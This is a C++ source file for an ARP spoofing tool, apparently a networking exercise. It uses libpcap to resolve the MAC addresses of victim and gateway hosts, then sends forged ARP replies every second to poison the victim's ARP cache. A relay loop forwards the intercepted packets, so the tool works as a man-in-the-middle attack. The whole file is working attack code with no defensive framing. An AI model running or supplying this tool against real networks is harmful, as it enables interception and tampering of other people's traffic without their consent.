#define TYPE_ARP 0x0806
#define ETHERNET_PACKET_LENGTH 14
#define ETHERNET_TYPE_LEN 2
#define ARP_PACKET_LENGTH 42
#define ARP_DUMMY_LEN 6
#define ARP_OPCODE_LEN 2
#define MAC_ADDRESS_LEN 6
#define IP_ADDRESS_LEN 4
#include "sendarp_header.h"

using namespace std;

const uint8_t broad_mac_addr[] = "\xff\xff\xff\xff\xff\xff";
const uint8_t zero_mac_addr[] = "\x00\x00\x00\x00\x00\x00";
const uint8_t ethernet_type_arp[] = "\x08\x06";
const uint8_t arp_dummy[] = "\x00\x01\x08\x00\x06\x04";
const uint8_t arp_opcode_request[] = "\x00\x01";
const uint8_t arp_opcode_reply[] = "\x00\x02";
uint8_t packet1[2000];
uint8_t packet2[2000];
uint8_t my_ip_addr[4];
uint8_t my_mac_addr[6];
char* interface;

void usage(){
    printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
}

void get_my_mac_ip(){
    struct ifreq ifr;

    int fd1 = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    int fd2 = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);

    if (ioctl(fd1, SIOCGIFHWADDR, &ifr) == 0) memcpy(my_mac_addr, ifr.ifr_addr.sa_data, 6);
    if (ioctl(fd2, SIOCGIFADDR, &ifr) == 0) memcpy(my_ip_addr, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4);

    close(fd1);
    close(fd2);
}

int send_packet(Session* a, int opcode){
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];

    if ((fp= pcap_open_live(interface, 2000, 1, 100, errbuf)) == nullptr)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", interface);
        return -1;
    }

    Ethernet* ethernet = reinterpret_cast<Ethernet *>(packet1);
    ARP* arp = reinterpret_cast<ARP *>(packet1 + ETHERNET_PACKET_LENGTH);

    switch(opcode)
    {
    /* case 1 : get_sender_mac */
    case 1:
        memcpy(ethernet->Dmac, broad_mac_addr, MAC_ADDRESS_LEN);
        memcpy(ethernet->Smac, my_mac_addr, MAC_ADDRESS_LEN);
        memcpy(&ethernet->type, ethernet_type_arp, ETHERNET_TYPE_LEN);

        memcpy(arp->dummy, arp_dummy, ARP_DUMMY_LEN);
        memcpy(arp->opcode, arp_opcode_request, ARP_OPCODE_LEN);
        memcpy(arp->sender_mac, my_mac_addr, MAC_ADDRESS_LEN);
        memcpy(arp->sender_ip, my_ip_addr, IP_ADDRESS_LEN);
        memcpy(arp->target_mac, zero_mac_addr, MAC_ADDRESS_LEN);
        memcpy(arp->target_ip, a->sender_ip, IP_ADDRESS_LEN);
        break;

    /* case 2 : get_target_mac */
    case 2:
        memcpy(arp->target_ip, a->target_ip, IP_ADDRESS_LEN);
        break;

    /* case 3 : poisoning ARP table */
    case 3:
        memcpy(ethernet->Dmac, a->sender_mac, MAC_ADDRESS_LEN);
        memcpy(ethernet->Smac, my_mac_addr, MAC_ADDRESS_LEN);
        memcpy(&ethernet->type, ethernet_type_arp, ETHERNET_TYPE_LEN);

        memcpy(arp->dummy, arp_dummy, ARP_DUMMY_LEN);
        memcpy(arp->opcode, arp_opcode_reply, ARP_OPCODE_LEN);
        memcpy(arp->sender_mac, my_mac_addr, MAC_ADDRESS_LEN);
        memcpy(arp->sender_ip, a->target_ip, IP_ADDRESS_LEN);
        memcpy(arp->target_mac, a->sender_mac, MAC_ADDRESS_LEN);
        memcpy(arp->target_ip, a->sender_ip, IP_ADDRESS_LEN);
        break;
    }
    pcap_sendpacket(fp, const_cast<const unsigned char*>(packet1), ARP_PACKET_LENGTH);
    pcap_close(fp);
    return 0;
}

int get_mac(Session* a, int opcode){
    const char *dev = interface;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 10, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
    struct pcap_pkthdr* header;
    const u_char* packet;

    switch(opcode){
    case 1:
        while (true) {
            send_packet(a, 1);
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;

            int pointer = 14;
            const ARP* arp = reinterpret_cast<const ARP *>(packet + pointer);
            if(!memcmp(a->sender_ip, arp->sender_ip, 4)){
                memcpy(a->sender_mac, arp->sender_mac, 6);
                printf("Gotcha! I Got the sender mac addr.\n");
                break;
            }
        }
        break;
    case 2:
        while (true) {
            send_packet(a, 2);
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;

            int pointer = 14;
            const ARP* arp = reinterpret_cast<const ARP *>(packet + pointer);
            if(!memcmp(a->target_ip, arp->sender_ip, 4)){
                memcpy(a->target_mac, arp->sender_mac, 6);
                printf("Gotcha! I Got the target mac addr.\n");
                break;
            }
        }
        break;
    }
    pcap_close(handle);
    return 0;
}

[[noreturn]] void arp_poisoning(vector<Session*> Sessions){
    while(true){
        for(auto b : Sessions){
            send_packet(b, 3);
            printf("send arp-poisoning packet!\n");
        }
        sleep(1);
    }
}

void arp_relaying(vector<Session*> Sessions){
    const char *dev = interface;
    char errbuf[PCAP_ERRBUF_SIZE];    
    struct pcap_pkthdr* header;
    const u_char* packet;    
    int packet_length = 0;    
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    pcap_t *fp;

    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        const Ethernet* ethernet = reinterpret_cast<const Ethernet *>(packet);
        const IP* ip = reinterpret_cast<const IP *>(packet + ETHERNET_PACKET_LENGTH);
        const uint8_t* sender_mac = ethernet->Smac;

        for(auto c : Sessions){
            if(!memcmp(c->sender_mac, sender_mac, MAC_ADDRESS_LEN)){
                if(ntohs(ethernet->type) == TYPE_ARP) break;
                packet_length = ntohs(ip->total_length) + ETHERNET_PACKET_LENGTH;

                memcpy(packet2, packet, packet_length);
                memcpy(packet2, c->target_mac, MAC_ADDRESS_LEN);
                memcpy(packet2 + 6, my_mac_addr, MAC_ADDRESS_LEN);

                if ((fp= pcap_open_live(interface, 2000, 1, 100, errbuf)) == nullptr)
                {
                    fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", interface);
                    break;
                }

                pcap_sendpacket(fp, const_cast<const unsigned char*>(packet2), packet_length);
                printf("Relay packet success!, length : %d\n", packet_length);
                break;
            }
        }
    }
    printf("Error Detected while relaying packet\n");
}
